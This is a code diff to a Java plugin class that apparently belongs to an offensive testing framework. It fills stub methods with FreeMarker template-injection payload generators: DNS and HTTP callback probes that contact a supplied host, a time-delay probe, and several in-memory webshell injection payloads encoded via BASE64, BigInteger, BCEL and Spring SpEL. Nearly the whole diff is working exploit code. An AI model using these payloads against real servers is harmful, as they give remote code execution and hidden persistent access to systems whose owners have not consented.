@@ -1,9 +1,7 @@
 package me.gv7.woodpecker.plugin.exprs;
 
 import me.gv7.woodpecker.plugin.IExpr;
-import me.gv7.woodpecker.plugin.utils.ArgumentTokenizer;
-import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
-import me.gv7.woodpecker.plugin.utils.Utils;
+import me.gv7.woodpecker.plugin.utils.*;
 
 import static me.gv7.woodpecker.plugin.utils.Utils.escape;
 
@@ -26,22 +24,41 @@ public class FreeMarkerExpr implements IExpr {
 
     @Override
     public String[] genDnslog(String domain) {
-        return null;
+        return new String[]{
+                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.net.InetSocketAddress\", \"" + domain + "\").getAddress()}")
+        };
     }
 
     @Override
     public String[] genHttplog(String url) {
-        return null;
+        return new String[]{
+                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"new java.net.URL('" + url + "').getContent();\")}")
+        };
     }
 
     @Override
     public String[] genSleep(int sec) {
-        return null;
+        return new String[]{
+                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.swing.JRadioButton\").doClick(" + sec * 1000 + ")}")
+        };
     }
 
     @Override
     public String[] genMemShell(byte[] memShellClass) {
-        return null;
+        try {
+            return new String[]{
+                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
+                    "[+] 以下方案需具有SpEL依赖",
+                    "[+] Spring反射组件方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell1(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <==",
+                    "[+] BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell2(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <=="
+            };
+        } catch (Exception ex) {
+            return new String[]{
+                    "class文件异常"
+            };
+        }
     }
 
     @Override
